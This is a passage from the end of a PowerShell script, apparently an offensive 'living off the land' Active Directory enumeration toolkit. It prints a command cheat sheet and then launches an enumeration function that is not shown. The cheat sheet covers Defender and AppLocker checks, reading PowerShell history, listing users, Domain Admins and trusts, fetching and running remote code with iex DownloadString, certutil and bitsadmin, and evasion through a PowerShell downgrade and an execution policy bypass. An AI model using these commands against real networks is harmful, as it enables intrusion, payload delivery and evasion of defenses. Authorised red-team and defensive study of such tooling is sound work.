    Write-Host "Get-ExecutionPolicy -List                       - Execution policy" -ForegroundColor White
    Write-Host "Set-ExecutionPolicy Bypass -Scope Process       - Bypass policy" -ForegroundColor White
    Write-Host "Get-MpComputerStatus                            - Defender status" -ForegroundColor White
    Write-Host "Get-MpPreference                                - Defender config" -ForegroundColor White
    Write-Host "Get-Content `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ForegroundColor White
    Write-Host "                                                - PS History" -ForegroundColor Gray
    
    Write-Host ""
    Write-Host "[*] ACTIVE DIRECTORY MODULE" -ForegroundColor Yellow
    Write-Host "Get-ADDomain                                    - Domain info" -ForegroundColor White
    Write-Host "Get-ADForest                                    - Forest info" -ForegroundColor White
    Write-Host "Get-ADUser -Filter *                            - All users" -ForegroundColor White
    Write-Host "Get-ADComputer -Filter *                        - All computers" -ForegroundColor White
    Write-Host "Get-ADGroup -Filter *                           - All groups" -ForegroundColor White
    Write-Host "Get-ADGroupMember -Identity ""Domain Admins""    - Group members" -ForegroundColor White
    Write-Host "Get-ADDomainController -Filter *                - All DCs" -ForegroundColor White
    Write-Host "Get-ADTrust -Filter *                           - Domain trusts" -ForegroundColor White
    Write-Host "Get-GPO -All                                    - All GPOs" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] SECURITY CHECKS" -ForegroundColor Yellow
    Write-Host "sc query windefend                              - Defender service" -ForegroundColor White
    Write-Host "qwinsta                                         - Active sessions" -ForegroundColor White
    Write-Host "query user                                      - Logged users" -ForegroundColor White
    Write-Host "schtasks /query /fo LIST /v                     - Scheduled tasks" -ForegroundColor White
    Write-Host "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor White
    Write-Host "                                                - Autorun keys" -ForegroundColor Gray
    Write-Host "Get-AppLockerPolicy -Effective                  - AppLocker rules" -ForegroundColor White
    Write-Host "driverquery                                     - Installed drivers" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] DOWNLOAD METHODS" -ForegroundColor Yellow
    Write-Host "powershell -nop -c ""iex(New-Object Net.WebClient).DownloadString('URL')""" -ForegroundColor White
    Write-Host "(New-Object Net.WebClient).DownloadFile('URL','path')" -ForegroundColor White
    Write-Host "Invoke-WebRequest -Uri 'URL' -OutFile 'path'    - Download file" -ForegroundColor White
    Write-Host "certutil -urlcache -split -f 'URL' path         - CertUtil download" -ForegroundColor White
    Write-Host "Start-BitsTransfer -Source 'URL' -Destination path" -ForegroundColor White
    Write-Host "bitsadmin /transfer job /download /priority high 'URL' path" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] EVASION TECHNIQUES" -ForegroundColor Yellow
    Write-Host "powershell.exe -version 2                       - Downgrade PS" -ForegroundColor White
    Write-Host "net1 user /domain                               - Alternative net" -ForegroundColor White
    Write-Host "Set-ExecutionPolicy Bypass -Scope Process       - Bypass policy" -ForegroundColor White
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
}

# Execute the main enumeration function
Write-Host ""
Write-Host "[*] Starting AD LOTL Enumeration..." -ForegroundColor Cyan
Write-Host "[*] Type 'Get-LOTLCommands' for quick command reference" -ForegroundColor Gray
Write-Host ""
Invoke-ADEnumeration
